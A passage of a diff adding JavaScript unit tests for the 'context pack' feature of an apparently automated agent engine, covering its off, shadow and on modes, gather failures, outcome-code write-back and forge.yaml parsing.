+    assert.equal((await run(withComment(`Also: ${Q}`, "OWNER"))).terminalReason, "merged");
+  });
+
+  it("shadow (default): compiled and recorded, the plan prompt is unchanged", async () => {
+    const w = withPack(), off = world(), dir = tmpDir("core-");
+    await run(w, { dir });
+    await run(off, { contextPack: { mode: "off" } });
+    assert.equal(builders(w)[0][4], builders(off)[0][4]);
+    assert.ok(!builders(w)[0][4].includes("Context pack"));
+    assert.equal(ctx(w).length, 1);
+    assert.equal(readLog(dir, 7).find((e) => e.event === "CONTEXT_PACK").mode, "shadow");
+  });
+
+  it("off: no gathering, no record, no event; the run is today's", async () => {
+    const w = withPack(), dir = tmpDir("core-");
+    const r = await run(w, { dir, contextPack: { mode: "off" } });
+    assert.equal(r.terminalReason, "merged");
+    assert.equal(w.packCalls.length, 0);
+    assert.equal(ctx(w).length, 0);
+    assert.ok(!readLog(dir, 7).some((e) => e.event === "CONTEXT_PACK"));
+    assert.ok(!w.telemetry.some((x) => x.event === "CONTEXT_PACK"));
+    assert.equal(readLog(dir, 7).find((e) => e.event === "RUN_TERMINAL").context_pack, "off");
+  });
+
+  it("a contract cannot quote the pack: requirements are checked against the issue only", async () => {
+    const bad = { ...CONTRACT, requirements: [{ id: "R1", quote: "Parent says: the zebra protocol must be kept.", disposition: "deliver" }] };
+    const w = withPack({ contract: bad });
+    const r = await run(w, { contextPack: { mode: "on" } });
+    assert.equal(r.terminalReason, "needs-human");
+    assert.equal(r.code, OUTCOME_CODES.CONTRACT_INVALID);
+  });
+
+  it("a gather failure never fails the run: anomaly, prompt unchanged", async () => {
+    const w = world(); w.io.contextFacts = async () => { throw new Error("gh down"); };
+    const r = await run(w, { contextPack: { mode: "on" } });
+    assert.equal(r.terminalReason, "merged");
+    assert.ok(!builders(w)[0][4].includes("Context pack"));
+    assert.ok(traj(w)[0].includes("Context pack not compiled"));
+  });
+
+  it("write-back: the terminal FORGE:STATE carries the typed outcome code and failure classes the compiler reads", async () => {
+    const w = world({ reviews: [bad(), bad()] });
+    w.leaseWrites = []; w.io.projector = { readState: async () => null, writeState: async (_i, st) => { w.leaseWrites.push(st); } };
+    const r = await run(w);
+    assert.equal(r.terminalReason, "needs-human");
+    const last = w.leaseWrites.at(-1);
+    assert.deepEqual([last.terminal, last.terminalReason, last.terminalCode, last.failureClasses], [true, "needs-human", OUTCOME_CODES.CONFORMANCE_UNIMPLEMENTED, [OUTCOME_CODES.CONFORMANCE_UNIMPLEMENTED]]);
+    const m = world(); m.leaseWrites = []; m.io.projector = { readState: async () => null, writeState: async (_i, st) => { m.leaseWrites.push(st); } };
+    await run(m);
+    assert.deepEqual([m.leaseWrites.at(-1).terminalCode, m.leaseWrites.at(-1).failureClasses], [OUTCOME_CODES.COMPLETED, []]);
+  });
+
+  it("forge.yaml engine.context_pack* is read flat; invalid mode is ignored", () => {
+    const d = tmpDir("ctxcfg-");
+    writeFileSync(join(d, "forge.yaml"), "engine:\n  context_pack: on\n  context_pack_sources: graph,attempts\n  context_pack_bytes: 4096\n");
+    assert.deepEqual(readContextPack(d), { mode: "on", sources: "graph,attempts", bytes: 4096 });
+    writeFileSync(join(d, "forge.yaml"), "engine:\n  context_pack: maybe\n");
+    assert.equal(readContextPack(d), undefined);
+    writeFileSync(join(d, "forge.yaml"), "engine:\n  conformance: shadow\n");
+    assert.equal(readContextPack(d), undefined);
   });
 });
 
